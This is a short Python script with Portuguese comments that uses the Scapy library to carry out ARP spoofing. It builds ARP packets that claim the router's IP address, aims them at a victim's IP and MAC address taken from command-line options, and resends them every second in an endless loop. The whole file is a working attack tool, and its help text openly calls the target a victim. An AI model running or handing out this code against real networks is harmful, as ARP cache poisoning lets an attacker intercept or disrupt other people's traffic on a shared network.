# opcode 1 da tabela ARP equivale a Request
# Referencia do opcode: https://www.iana.org/assignments/arp-parameters/arp-parameters.xhtml

#Vamos importar a biblioteca de rede
from scapy.all import *
from scapy.layers.l2 import ARP  
#argumentos
import optparse
#Trabalhar com o tempo
import time


def spoff(r,d,m):
    #Montagem do pacote arp
    op = 1
    arp = ARP(op=op, psrc=r, pdst=d, hwdst=m) 
    # 1 == True
    while 1:
        #enviar requisição ARP
        send(arp)
        #Time de 1 segundo
        time.sleep(1)

if __name__=='__main__':

    parser = optparse.OptionParser('Utilize o programa dessa forma: -r <IP da rede wi-fi> -d <IP do alvo> -m <Mac do alvo>')
    parser.add_option('-r', dest='r', type='string', help='Informe o IP do rotador.')
    parser.add_option('-d', dest='d', type='string', help='Informe o IP da vitíma.')
    parser.add_option('-m', dest='m', type='string', help='Informe o Mac da vitíma')
    (options, args) =  parser.parse_args()
    if options.r == None or options.d == None or options.m == None:
        print(parser.usage) # vai mostrar informações de uso
        exit(0)
        
    else:
        r = options.r
        r = str(r).replace(' ','')
        d = options.d
        d = str(d).replace(' ','')
        m = options.m 
        m = str(m).replace('.',':')
        m = m.replace(' ', '')
        spoff(r,d,m) #chama a função e os parametros





















